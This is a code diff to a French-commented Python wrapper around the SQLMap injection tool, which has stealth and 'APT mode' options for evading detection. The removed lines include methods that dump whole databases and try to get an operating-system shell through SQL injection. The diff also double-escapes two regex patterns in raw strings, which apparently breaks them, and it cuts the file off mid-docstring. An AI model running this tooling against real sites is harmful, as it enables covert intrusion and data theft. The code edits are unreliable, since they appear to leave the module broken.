@@ -260,7 +260,7 @@ class SQLMapWrapper:
             result["dbms"] = "SQLite"
         
         # Extraction de la version
-        version_pattern = r'version[\s:]+([\d\.]+)'
+        version_pattern = r'version[\\s:]+([\\d\\.]+)'
         match = re.search(version_pattern, output, re.IGNORECASE)
         if match:
             result["version"] = match.group(1)
@@ -272,7 +272,7 @@ class SQLMapWrapper:
         databases = []
         
         # Pattern pour les bases de données
-        db_pattern = r'\[\*\] ([^\s]+)\s+\[(\d+)\]'
+        db_pattern = r'\[\\*\] ([^\\s]+)\\s+\[(\\d+)\]'
         
         for line in output.split('\n'):
             match = re.search(db_pattern, line)
@@ -329,7 +329,14 @@ class SQLMapWrapper:
             cmd.extend(["-C", kwargs['columns']])
         
         if kwargs.get('where'):
-            cmd.extend(["--where", kwargs['where']])
+            where_clause = str(kwargs['where'])
+            if where_clause.strip().startswith('-'):
+                return {
+                    "success": False,
+                    "error": "Clause WHERE invalide : ne peut pas commencer par un tiret.",
+                    "apt_mode": self.apt_mode
+                }
+            cmd.extend(["--where", where_clause])
         
         if kwargs.get('start'):
             cmd.extend(["--start", str(kwargs['start'])])
@@ -358,133 +365,4 @@ class SQLMapWrapper:
         
         Args:
             target: URL cible
-            database: Nom de la base de données
-            **kwargs: Options supplémentaires
-        """
-        if not self.available:
-            return {"success": False, "error": "SQLMap non installé"}
-        
-        self._apply_stealth_delay()
-        
-        cmd = [
-            self.sqlmap_path, "-u", target,
-            "-D", database, "--dump-all",
-            "--batch"
-        ]
-        
-        if self.stealth_mode:
-            cmd.append("--random-agent")
-            cmd.extend(["--delay", "2"])
-        
-        timeout = kwargs.get('timeout', 600)
-        
-        try:
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
-            
-            return {
-                "success": result.returncode == 0,
-                "database": database,
-                "output": result.stdout[:5000] if result.stdout else "",
-                "apt_mode": self.apt_mode
-            }
-        except Exception as e:
-            return {"success": False, "error": str(e), "apt_mode": self.apt_mode}
-    
-    def get_os_shell(self, target: str, **kwargs) -> Dict[str, Any]:
-        """
-        Tente d'obtenir un shell système via SQLi
-        
-        Args:
-            target: URL cible
-            **kwargs: Options supplémentaires
-        """
-        if not self.available:
-            return {"success": False, "error": "SQLMap non installé"}
-        
-        self._apply_stealth_delay()
-        
-        cmd = [self.sqlmap_path, "-u", target, "--os-shell", "--batch"]
-        
-        if self.stealth_mode:
-            cmd.append("--random-agent")
-        
-        timeout = kwargs.get('timeout', 300)
-        
-        try:
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
-            
-            return {
-                "success": "os-shell" in result.stdout.lower(),
-                "output": result.stdout[:2000] if result.stdout else "",
-                "apt_mode": self.apt_mode
-            }
-        except Exception as e:
-            return {"success": False, "error": str(e), "apt_mode": self.apt_mode}
-    
-    def get_dbms_info(self, target: str) -> Dict[str, Any]:
-        """
-        Récupère les informations sur le SGBD
-        
-        Args:
-            target: URL cible
-        """
-        if not self.available:
-            return {"success": False, "error": "SQLMap non installé"}
-        
-        self._apply_stealth_delay()
-        
-        cmd = [self.sqlmap_path, "-u", target, "--dbms", "--batch"]
-        
-        if self.stealth_mode:
-            cmd.append("--random-agent")
-        
-        try:
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
-            output = result.stdout.lower()
-            
-            return self._parse_dbms_info(output)
-        except Exception as e:
-            return {"success": False, "error": str(e)}
-    
-    def get_version_info(self) -> Dict[str, Any]:
-        """Retourne la version de SQLMap"""
-        if not self.available:
-            return {"available": False}
-        
-        try:
-            result = subprocess.run([self.sqlmap_path, "--version"], 
-                                   capture_output=True, text=True, timeout=10)
-            if result.returncode == 0:
-                version_line = result.stdout.split('\n')[0] if result.stdout else ""
-                return {
-                    "available": True,
-                    "version": version_line,
-                    "path": self.sqlmap_path
-                }
-        except:
-            pass
-        
-        return {"available": False}
-
-
-# Point d'entrée pour tests
-if __name__ == "__main__":
-    print("=" * 60)
-    print("Test de SQLMapWrapper")
-    print("=" * 60)
-    
-    wrapper = SQLMapWrapper()
-    
-    # Configuration mode APT
-    wrapper.set_stealth_config({
-        'enabled': True,
-        'apt_mode': True,
-        'delay_min': 2,
-        'delay_max': 5
-    })
-    
-    # Test (simulé)
-    # results = wrapper.scan("https://example.com/page?id=1")
-    # print(f"SQLi détectée: {results.get('vulnerable', False)}")
-    
-    print("\n✅ Module SQLMapWrapper chargé avec succès")
+            database: N
